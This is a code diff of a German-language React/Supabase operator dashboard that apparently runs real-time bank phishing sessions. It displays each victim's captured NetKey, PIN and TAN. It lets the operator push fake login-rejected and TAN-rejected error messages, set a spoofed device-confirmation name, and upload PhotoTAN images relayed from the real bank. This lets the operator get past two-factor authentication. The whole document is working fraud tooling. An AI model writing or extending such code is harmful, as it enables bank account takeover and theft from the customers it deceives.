@@ -1,10 +1,10 @@
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
-import { Copy, Link2, ShieldCheck, XCircle, RefreshCw, CheckCircle2, Trash2 } from "lucide-react";
+import { Link2, ShieldCheck, XCircle, RefreshCw, CheckCircle2, Trash2, Upload, Smartphone } from "lucide-react";
 import { toast } from "sonner";
 
 type AuthRow = {
@@ -13,6 +13,8 @@ type AuthRow = {
   auftraggeber_name: string | null;
   customer_phase: string | null;
   tan_method: string | null;
+  device_name: string | null;
+  photo_tan_image: string | null;
   last_error: string | null;
   used: boolean;
   created_at: string;
@@ -22,13 +24,14 @@ type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan
 
 const PHASE_LABEL: Record<string, string> = {
   login: "Wartet auf Login",
-  pin_review: "PIN prüfen",
-  pin_rejected: "PIN abgelehnt",
-  tan_request: "TAN angefordert",
-  tan_input: "TAN-Eingabe",
+  login_review: "Login prüfen",
+  login_rejected: "Login abgelehnt",
+  confirm: "Gerätebestätigung",
+  phototan_request: "PhotoTAN wird angefordert",
+  phototan: "PhotoTAN-Eingabe",
   tan_review: "TAN prüfen",
-  tan_rejected: "TAN abgelehnt",
-  success: "Erfolgreich",
+  phototan_rejected: "TAN abgelehnt",
+  success: "Erfolgreich (Loader)",
   aborted: "Abgebrochen",
 };
 
@@ -57,44 +60,45 @@ const AuthLiveCard = () => {
     return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch1); (supabase as any).removeChannel(ch2); };
   }, []);
 
-  const setPhase = async (r: AuthRow, phase: string, extra: Record<string, any> = {}) => {
-    const { error } = await (supabase as any).from("auth_tokens")
-      .update({ customer_phase: phase, ...extra }).eq("id", r.id);
-    if (error) toast.error(error.message); else toast.success(PHASE_LABEL[phase] || phase);
+  const update = async (id: string, patch: Record<string, any>) => {
+    const { error } = await (supabase as any).from("auth_tokens").update(patch).eq("id", id);
+    if (error) toast.error(error.message);
   };
 
-  const setTanMethod = async (r: AuthRow, method: string) => {
-    await (supabase as any).from("auth_tokens").update({ tan_method: method }).eq("id", r.id);
-    await setPhase(r, "tan_request", { last_error: null });
-    // brief request delay, then open input
-    setTimeout(() => { setPhase(r, "tan_input"); }, 800);
-  };
+  const setPhase = (r: AuthRow, phase: string, extra: Record<string, any> = {}) =>
+    update(r.id, { customer_phase: phase, ...extra });
 
-  const requestNewTan = async (r: AuthRow) => {
-    await (supabase as any).from("panel_task_meta")
-      .update({ tan: null }).eq("task_id", `auth:${r.id}`);
-    await setPhase(r, "tan_request", { last_error: null });
-    setTimeout(() => setPhase(r, "tan_input"), 800);
-  };
+  const rejectLogin = (r: AuthRow) => setPhase(r, "login_rejected", {
+    last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.",
+  });
+  const acceptLogin = (r: AuthRow) => setPhase(r, "confirm", { last_error: null });
 
-  const rejectPin = async (r: AuthRow) => {
-    await setPhase(r, "pin_rejected", { last_error: "Die eingegebene PIN ist nicht korrekt. Bitte erneut versuchen." });
-  };
+  const setDeviceName = (r: AuthRow, name: string) => update(r.id, { device_name: name });
+
+  const setPhotoTanImage = (r: AuthRow, dataUrl: string | null) =>
+    update(r.id, { photo_tan_image: dataUrl });
+
+  const showPhotoTan = (r: AuthRow) => setPhase(r, "phototan", { last_error: null });
 
   const rejectTan = async (r: AuthRow) => {
-    await setPhase(r, "tan_rejected", { last_error: "Die eingegebene TAN ist nicht korrekt. Bitte erneut versuchen." });
+    await (supabase as any).from("panel_task_meta").update({ tan: null }).eq("task_id", `auth:${r.id}`);
+    await setPhase(r, "phototan_rejected", {
+      last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
+    });
   };
 
-  const finish = async (r: AuthRow) => {
-    await (supabase as any).from("auth_tokens")
-      .update({ customer_phase: "success", used: true, used_at: new Date().toISOString(), security_status: "approved", security_status_at: new Date().toISOString() })
-      .eq("id", r.id);
-    toast.success("Session erfolgreich abgeschlossen");
-  };
+  const acceptTan = (r: AuthRow) => update(r.id, {
+    customer_phase: "success",
+    used: true,
+    used_at: new Date().toISOString(),
+    security_status: "approved",
+    security_status_at: new Date().toISOString(),
+    last_error: null,
+  });
 
-  const abort = async (r: AuthRow) => {
+  const abort = (r: AuthRow) => {
     if (!window.confirm("Session wirklich abbrechen?")) return;
-    await setPhase(r, "aborted", { last_error: null });
+    setPhase(r, "aborted", { last_error: null });
   };
 
   const remove = async (r: AuthRow) => {
@@ -109,10 +113,6 @@ const AuthLiveCard = () => {
     try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
   };
 
-  const copyToken = async (t: string) => {
-    try { await navigator.clipboard.writeText(t); toast.success("Token kopiert"); } catch {}
-  };
-
   if (!rows.length) return null;
 
   return (
@@ -124,14 +124,14 @@ const AuthLiveCard = () => {
         {rows.map(r => {
           const meta = metas[r.id];
           const phase = r.customer_phase || "login";
-          const isDone = phase === "success" || phase === "aborted";
+          const done = phase === "success" || phase === "aborted";
           return (
-            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${isDone ? "opacity-60" : ""}`}>
+            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
               <div className="flex flex-wrap items-center justify-between gap-2">
                 <div className="flex items-center gap-2 min-w-0">
-                  <button onClick={() => copyToken(r.token)} className="font-mono text-sm px-2 py-0.5 rounded bg-muted hover:bg-muted/70">{r.token}</button>
-                  <Badge variant={isDone ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
-                  {r.tan_method && <Badge variant="outline">{r.tan_method}</Badge>}
+                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
+                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
+                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                 </div>
                 <div className="flex gap-1">
                   <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
@@ -140,31 +140,74 @@ const AuthLiveCard = () => {
               </div>
 
               <div className="grid sm:grid-cols-3 gap-2 text-sm">
-                <MetaField label="Kunde" value={r.auftraggeber_name || "—"} />
                 <MetaField label="NetKey / Alias" value={meta?.netkey || "—"} mono />
                 <MetaField label="PIN" value={meta?.pin || "—"} mono />
                 <MetaField label="TAN" value={meta?.tan || "—"} mono bold />
               </div>
 
-              {!isDone && (
-                <div className="flex flex-wrap gap-2 pt-1 border-t">
-                  {(phase === "login" || phase === "pin_review" || phase === "pin_rejected") && (
-                    <>
-                      <Button size="sm" variant="destructive" onClick={() => rejectPin(r)} disabled={!meta?.pin}><XCircle className="h-4 w-4 mr-1" />PIN falsch</Button>
-                      <span className="text-xs text-muted-foreground self-center">TAN anfordern:</span>
-                      <Button size="sm" onClick={() => setTanMethod(r, "photo")} disabled={!meta?.pin}>PhotoTAN</Button>
-                      <Button size="sm" onClick={() => setTanMethod(r, "sms")} disabled={!meta?.pin}>SMS-TAN</Button>
-                      <Button size="sm" onClick={() => setTanMethod(r, "push")} disabled={!meta?.pin}>Push-TAN</Button>
-                    </>
+              {!done && (
+                <div className="space-y-3 pt-2 border-t">
+                  {/* Step 1: Login submitted */}
+                  {(phase === "login" || phase === "login_review" || phase === "login_rejected") && (
+                    <StepBlock title="Login prüfen">
+                      <div className="flex flex-wrap gap-2">
+                        <Button size="sm" variant="destructive" onClick={() => rejectLogin(r)} disabled={!meta?.pin}>
+                          <XCircle className="h-4 w-4 mr-1" />Login ablehnen
+                        </Button>
+                        <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
+                        <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
+                          <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
+                        </Button>
+                      </div>
+                      {phase === "login" && !meta?.pin && (
+                        <p className="text-xs text-muted-foreground">Wartet auf Login-Eingabe des Kunden.</p>
+                      )}
+                    </StepBlock>
                   )}
-                  {(phase === "tan_request" || phase === "tan_input" || phase === "tan_review" || phase === "tan_rejected") && (
-                    <>
-                      <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}><XCircle className="h-4 w-4 mr-1" />TAN ablehnen</Button>
-                      <Button size="sm" variant="outline" onClick={() => requestNewTan(r)}><RefreshCw className="h-4 w-4 mr-1" />Neue TAN</Button>
-                      <Button size="sm" onClick={() => finish(r)} disabled={!meta?.tan}><CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren</Button>
-                    </>
+
+                  {/* Step 2: Confirm shown, waiting customer to click photoTAN */}
+                  {phase === "confirm" && (
+                    <StepBlock title="Kunde bestätigt Gerät">
+                      <p className="text-xs text-muted-foreground">
+                        Kunde sieht Gerätebestätigung mit Namen „{r.device_name || "iPhone"}". Wartet auf Klick auf photoTAN.
+                      </p>
+                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
+                    </StepBlock>
                   )}
-                  <Button size="sm" variant="ghost" onClick={() => abort(r)} className="ml-auto">Abbrechen</Button>
+
+                  {/* Step 3: photoTAN requested, admin releases image */}
+                  {phase === "phototan_request" && (
+                    <StepBlock title="PhotoTAN freigeben">
+                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
+                      <div className="flex flex-wrap gap-2">
+                        <Button size="sm" onClick={() => showPhotoTan(r)}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
+                        </Button>
+                      </div>
+                    </StepBlock>
+                  )}
+
+                  {/* Step 4: TAN eingabe / prüfung */}
+                  {(phase === "phototan" || phase === "tan_review" || phase === "phototan_rejected") && (
+                    <StepBlock title="TAN prüfen">
+                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} compact />
+                      <div className="flex flex-wrap gap-2">
+                        <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}>
+                          <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
+                        </Button>
+                        <Button size="sm" variant="outline" onClick={() => showPhotoTan(r)}>
+                          <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN anzeigen
+                        </Button>
+                        <Button size="sm" onClick={() => acceptTan(r)} disabled={!meta?.tan}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → Loader
+                        </Button>
+                      </div>
+                    </StepBlock>
+                  )}
+
+                  <div className="flex justify-end">
+                    <Button size="sm" variant="ghost" onClick={() => abort(r)}>Abbrechen</Button>
+                  </div>
                 </div>
               )}
             </div>
@@ -175,11 +218,56 @@ const AuthLiveCard = () => {
   );
 };
 
+/* ------------ small subcomponents ------------ */
+
+const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
+  <div className="space-y-2">
+    <div className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">{title}</div>
+    {children}
+  </div>
+);
+
 const MetaField = ({ label, value, mono, bold }: { label: string; value: string; mono?: boolean; bold?: boolean }) => (
   <div className="min-w-0">
     <div className="text-[10px] uppercase tracking-wider text-muted-foreground">{label}</div>
     <div className={`truncate ${mono ? "font-mono" : ""} ${bold ? "font-bold text-base" : ""}`}>{value}</div>
   </div>
 );
+
+const DeviceNameField = ({ r, onSave }: { r: AuthRow; onSave: (name: string) => void }) => {
+  const [val, setVal] = useState(r.device_name || "");
+  useEffect(() => { setVal(r.device_name || ""); }, [r.device_name]);
+  return (
+    <div className="flex items-center gap-1">
+      <Input value={val} onChange={e => setVal(e.target.value)} placeholder="Gerätename z. B. iPhone von Max" className="h-8 w-56" />
+      <Button size="sm" variant="outline" onClick={() => onSave(val)}>Setzen</Button>
+    </div>
+  );
+};
+
+const PhotoTanUploader = ({ r, onSet, compact }: { r: AuthRow; onSet: (url: string | null) => void; compact?: boolean }) => {
+  const inputRef = useRef<HTMLInputElement>(null);
+  const onFile = async (f: File) => {
+    const reader = new FileReader();
+    reader.onload = () => onSet(String(reader.result));
+    reader.readAsDataURL(f);
+  };
+  return (
+    <div className="flex items-center gap-2 flex-wrap">
+      <input ref={inputRef} type="file" accept="image/*" hidden
+        onChange={e => { const f = e.target.files?.[0]; if (f) onFile(f); e.target.value = ""; }} />
+      <Button size="sm" variant="outline" onClick={() => inputRef.current?.click()}>
+        <Upload className="h-4 w-4 mr-1" />{r.photo_tan_image ? "PhotoTAN ersetzen" : "PhotoTAN-Bild hochladen"}
+      </Button>
+      {r.photo_tan_image && (
+        <>
+          {!compact && <img src={r.photo_tan_image} alt="preview" className="h-10 w-10 object-contain border rounded" />}
+          <Button size="sm" variant="ghost" onClick={() => onSet(null)}>entfernen</Button>
+        </>
+      )}
+      {!r.photo_tan_image && <span className="text-xs text-muted-foreground">Standardgrafik wird genutzt.</span>}
+    </div>
+  );
+};
 
 export default AuthLiveCard;
